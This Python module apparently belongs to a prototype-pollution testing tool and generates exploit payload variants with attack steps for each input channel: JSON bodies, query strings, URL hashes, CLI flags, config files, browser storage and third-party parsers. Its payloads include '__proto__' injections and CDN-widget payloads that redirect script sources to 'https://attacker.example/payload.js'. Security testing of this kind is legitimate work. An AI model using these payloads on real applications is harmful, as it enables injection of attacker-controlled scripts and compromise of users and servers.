"""Generate richer payload guidance for exploit chains."""

from __future__ import annotations

from typing import Dict, List, Optional, Set, Tuple

from .payload_library import fingerprint_for_alias, payload_library

_PAYLOAD_CHANNELS = payload_library().get("payloads", {})


def _channel_payload(channel: str, fallback: str) -> Tuple[str, List[str]]:
    values = _PAYLOAD_CHANNELS.get(channel, [])
    normalized = [
        str(value)
        for value in values
        if isinstance(value, str) and value.strip()
    ]
    if not normalized:
        return fallback, []
    return normalized[0], normalized[1:]


def _unique_list(*groups: List[str]) -> List[str]:
    seen: Set[str] = set()
    result: List[str] = []
    for group in groups:
        for entry in group:
            entry = str(entry).strip()
            if not entry or entry in seen:
                continue
            seen.add(entry)
            result.append(entry)
    return result


def _cdn_payload_for_target(target: str) -> str:
    candidates = _PAYLOAD_CHANNELS.get("cdn", []) or []
    for candidate in candidates:
        if isinstance(candidate, str) and target in candidate:
            return candidate
    return f"?__proto__[{target}][src]=https://attacker.example/"


PAYLOAD_OBJECT, PAYLOAD_OBJECT_ALTS = _channel_payload("object", '{"__proto__":{"polluted":"owned"}}')
PAYLOAD_POINTER, PAYLOAD_POINTER_ALTS = _channel_payload("pointer", "constructor[prototype][polluted]=owned")
PAYLOAD_QUERY, PAYLOAD_QUERY_ALTS = _channel_payload("query", "?__proto__[polluted]=owned")
PAYLOAD_HASH, PAYLOAD_HASH_ALTS = _channel_payload("hash", "#__proto__[polluted]=owned")
PAYLOAD_CLI, PAYLOAD_CLI_ALTS = _channel_payload("cli", "--__proto__[polluted]=owned")
PAYLOAD_PROTOFIND, PAYLOAD_PROTOFIND_ALTS = _channel_payload("protoFind", "?__proto__[elo]=melo")
PAYLOAD_CDN, PAYLOAD_CDN_ALTS = _channel_payload("cdn", "?__proto__[_analytics][0][scriptSrc]=https://attacker.example/payload.js")
CDN_PAYLOAD_ANALYTICS = _cdn_payload_for_target("_analytics")
CDN_PAYLOAD_SATELLITE = _cdn_payload_for_target("_satellite")
CDN_PAYLOAD_PARSEPARAMS = _cdn_payload_for_target("$parseParams")
THIRD_PARTY_SOURCE_VARIANTS: Dict[str, Dict[str, object]] = {
    "browser.parser.analytics-utils": {
        "channel": "http-query",
        "label": "analytics-utils queue poisoning",
        "payload": CDN_PAYLOAD_PARSEPARAMS,
        "category": "cdn",
        "notes": (
            "ppfang heuristic: analytics-utils copies window.location query params into "
            "window._analytics via $parseParams. Pollute those keys before analytics widgets initialize "
            "to hijack script sources."
        ),
        "steps": [
            "Replay the payload against {route} before analytics bundles load.",
            "Confirm `_analytics` queue entries now point at the attacker-controlled script."
        ],
        "alternates": _unique_list([CDN_PAYLOAD_ANALYTICS]),
    },
    "browser.parser.jquery-deparam": {
        "channel": "http-query",
        "label": "jquery-deparam recursive merge",
        "payload": "?__proto__.test=test",
        "category": "browser",
        "notes": (
            "ppfang heuristic: jquery-deparam builds nested objects for every query key, so prototype "
            "keys survive even when mix of parameters exist."
        ),
        "steps": [
            "Send requests to {route} and mix the payload with normal query parameters.",
            "Rotate each parameter (proto-find style) to confirm the parser copies prototype keys."
        ],
        "alternates": _unique_list(PAYLOAD_QUERY_ALTS),
    },
}

HTTP_BODY_SOURCES = {
    "http.request.body",
    "http.request.headers",
    "http.request.params",
    "config.file.readFile",
    "websocket.onMessage",
}
HTTP_QUERY_SOURCES = {
    "http.request.query",
    "http.request.params",
    "browser.parser.analytics-utils",
    "browser.parser.arg-js",
    "browser.parser.can-deparam",
    "browser.parser.jquery-bbq",
    "browser.parser.jquery-deparam",
    "browser.parser.jquery-query-object",
    "browser.parser.component-querystring",
    "browser.parser.purl",
    "browser.parser.mutiny",
    "browser.url.searchParams",
    "browser.url.parse",
    "browser.location.search",
}
HASH_SOURCES = {
    "browser.location.hash",
}
CLI_SOURCES = {
    "cli.process.argv",
    "cli.parser.minimist",
    "cli.parser.yargs",
}
CONFIG_SOURCES = {
    "config.process.env",
}
BROWSER_STORAGE_SOURCES = {
    "browser.storage",
}


def _route_label(route: Optional[Tuple[str, str]]) -> str:
    if not route:
        return "the vulnerable function"
    method, path = route
    label = f"{(method or '').strip()} {(path or '').strip()}".strip()
    return label or "the vulnerable route"


def _variant(
    channel: str,
    label: str,
    payload: str,
    *,
    category: str,
    notes: str,
    steps: Optional[List[str]] = None,
    alternates: Optional[List[str]] = None,
) -> Dict[str, object]:
    return {
        "channel": channel,
        "label": label,
        "payload": payload,
        "category": category,
        "notes": notes,
        "steps": steps or [],
        "alternates": alternates or [],
    }


def _query_steps(route_label: str) -> List[str]:
    return [
        f"Send requests to {route_label} and replace each query parameter value one-at-a-time with the payload.",
        "Tools like proto-find iterate each parameter automatically; keep original values for untouched parameters.",
    ]


def _hash_steps(route_label: str) -> List[str]:
    return [
        f"Append the payload to {route_label} after the '#' fragment so single-page routers copy polluted keys.",
        "Modern bundlers often copy hash fragments into config objects without sanitization.",
    ]


def _cdn_variant(fingerprint: Dict[str, object], metadata: Dict[str, object]) -> Dict[str, object] | None:
    globals_list = fingerprint.get("fingerprintGlobals") or []
    if not globals_list:
        return None
    target = globals_list[0]
    label = f"{fingerprint.get('name', 'CDN widget')} prototype"
    notes = (
        "ppfang heuristics: poison third-party widget defaults before it initializes so it loads attacker code "
        f"(e.g., set {target} handlers or URLs on Object.prototype)."
    )
    payload = _cdn_payload_for_target(target)
    alternates = []
    for alt_target in globals_list[1:]:
        alternates.append(_cdn_payload_for_target(alt_target))
    alternates.extend(PAYLOAD_CDN_ALTS)
    return _variant(
        "cdn-widget",
        label,
        payload,
        category="cdn",
        notes=notes,
        steps=[
            "Inject the payload before the CDN script executes.",
            "Focus on globals highlighted by ppmap/ppfang like analytics queues or sanitizer allowlists.",
        ],
        alternates=_unique_list(alternates),
    )


def _third_party_variant(source_kind: str, route_label: str) -> Dict[str, object] | None:
    template = THIRD_PARTY_SOURCE_VARIANTS.get(source_kind)
    if not template:
        return None
    steps = [step.replace("{route}", route_label) for step in template.get("steps", [])]
    alternates = template.get("alternates") or []
    return _variant(
        template.get("channel", "http-query"),
        template.get("label", "Third-party payload"),
        str(template.get("payload") or PAYLOAD_QUERY),
        category=str(template.get("category") or "browser"),
        notes=str(template.get("notes") or ""),
        steps=steps,
        alternates=list(alternates),
    )


def build_payload_variants(
    source_kind: str,
    route: Optional[Tuple[str, str]],
    metadata: Dict[str, object],
    gadget_kind: Optional[str],
    *,
    fallback_payload: str,
) -> List[Dict[str, object]]:
    """Produce payload variants tailored to the detected source/gadget."""

    variants: List[Dict[str, object]] = []
    route_label = _route_label(route)

    if source_kind in HTTP_BODY_SOURCES:
        variants.append(
            _variant(
                "http-json",
                "JSON body",
                PAYLOAD_OBJECT,
                category="server",
                notes="Send JSON body with polluted `__proto__` keys to merge operations (Object.assign/lodash).",
                steps=[
                    f"POST {route_label} with a JSON body that includes prototype keys.",
                    "If validation removes unknown keys, switch to constructor.prototype keys.",
                ],
                alternates=_unique_list(PAYLOAD_OBJECT_ALTS, [PAYLOAD_POINTER], PAYLOAD_POINTER_ALTS),
            )
        )

    if source_kind in HTTP_QUERY_SOURCES:
        variants.append(
            _variant(
                "http-query",
                "Query string",
                PAYLOAD_QUERY,
                category="browser" if metadata.get("clientGadget") else "server",
                notes="Append prototype payloads to the query string. Proto-find style scanning mutates each parameter individually.",
                steps=_query_steps(route_label),
                alternates=_unique_list(PAYLOAD_QUERY_ALTS, [PAYLOAD_POINTER], PAYLOAD_POINTER_ALTS),
            )
        )
        variants.append(
            _variant(
                "http-query",
                "Parameter rotation (proto-find)",
                PAYLOAD_PROTOFIND,
                category="browser" if metadata.get("clientGadget") else "server",
                notes="Use proto-find style scanning to mutate each query parameter sequentially while keeping other parameters intact.",
                steps=[
                    "Capture the original query string for the route.",
                    "Replace one parameter at a time with the payload while leaving the rest untouched to mimic proto-find behaviour.",
                ],
                alternates=_unique_list(PAYLOAD_PROTOFIND_ALTS, PAYLOAD_QUERY_ALTS),
            )
        )
        third_party = _third_party_variant(source_kind, route_label)
        if third_party:
            variants.append(third_party)

    if source_kind in HASH_SOURCES:
        variants.append(
            _variant(
                "browser-hash",
                "Fragment (#hash)",
                PAYLOAD_HASH,
                category="browser",
                notes="Many SPAs parse `location.hash` into config objects; placing payloads after '#' triggers pollution.",
                steps=_hash_steps(route_label),
                alternates=_unique_list(PAYLOAD_HASH_ALTS, PAYLOAD_POINTER_ALTS),
            )
        )

    if source_kind in CLI_SOURCES:
        variants.append(
            _variant(
                "cli-arg",
                "CLI argument",
                PAYLOAD_CLI,
                category="cli",
                notes="Pass polluted CLI flags so minimist/yargs merge them into runtime config.",
                steps=[
                    "Invoke the CLI with prototype-looking flags (e.g., `node server.js --__proto__[polluted]=owned`).",
                    "Repeat with constructor.prototype for frameworks that guard `__proto__`.",
                ],
                alternates=_unique_list(PAYLOAD_CLI_ALTS, [PAYLOAD_POINTER]),
            )
        )

    if source_kind in CONFIG_SOURCES:
        variants.append(
            _variant(
                "config-file",
                "Config file",
                PAYLOAD_OBJECT,
                category="server",
                notes="Drop polluted entries into JSON/YAML config before startup so env/config merges adopt them.",
                steps=[
                    "Modify configuration sources (env, config.json, etc.) to include prototype keys.",
                    "Restart the process and trigger routes that merge config into live objects.",
                ],
                alternates=_unique_list(PAYLOAD_OBJECT_ALTS, [PAYLOAD_POINTER], PAYLOAD_POINTER_ALTS),
            )
        )

    if source_kind in BROWSER_STORAGE_SOURCES:
        variants.append(
            _variant(
                "browser-storage",
                "localStorage/sessionStorage",
                PAYLOAD_OBJECT,
                category="browser",
                notes="Populate localStorage/sessionStorage with polluted JSON, then trigger the bundle to merge it.",
                steps=[
                    "Set storage entries via devtools or XSS-able gadget.",
                    "Reload the page so bootstrapping code merges polluted storage into runtime config.",
                ],
                alternates=_unique_list(PAYLOAD_OBJECT_ALTS, [PAYLOAD_POINTER], PAYLOAD_POINTER_ALTS),
            )
        )

    if gadget_kind:
        fingerprint = fingerprint_for_alias(gadget_kind)
        if fingerprint:
            cdn_variant = _cdn_variant(fingerprint, metadata)
            if cdn_variant:
                variants.append(cdn_variant)

    if not variants:
        category = "browser" if metadata.get("clientGadget") else "server"
        variants.append(
            _variant(
                "generic",
                "Generic payload",
                fallback_payload,
                category=category,
                notes="Replay the sample payload; adjust to match the transport (body, query, hash, or CLI flag).",
                steps=[
                    f"Exercise {route_label} with polluted data and observe the reported sink.",
                    "Use constructor.prototype style payloads if __proto__ keys are filtered.",
                ],
                alternates=_unique_list([PAYLOAD_POINTER], PAYLOAD_POINTER_ALTS),
            )
        )

    return variants
